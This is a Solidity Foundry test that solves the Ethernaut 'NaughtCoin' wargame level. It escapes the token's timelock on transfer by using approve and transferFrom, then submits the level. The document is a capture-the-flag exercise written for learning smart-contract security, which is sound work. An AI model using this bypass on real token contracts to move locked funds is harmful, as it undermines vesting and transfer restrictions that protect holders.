pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../../src/NaughtCoin/NaughtCoinFactory.sol";
import "../../src/Ethernaut.sol";
import "../utils/vm.sol";

contract NaughtCoinTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testNaughtCoinHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        //.transfer isn't the only way to move tokens
        ethernautNaughtCoin.approve(tx.origin, ethernautNaughtCoin.balanceOf(tx.origin));
        ethernautNaughtCoin.transferFrom(tx.origin, address(1), ethernautNaughtCoin.balanceOf(tx.origin));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}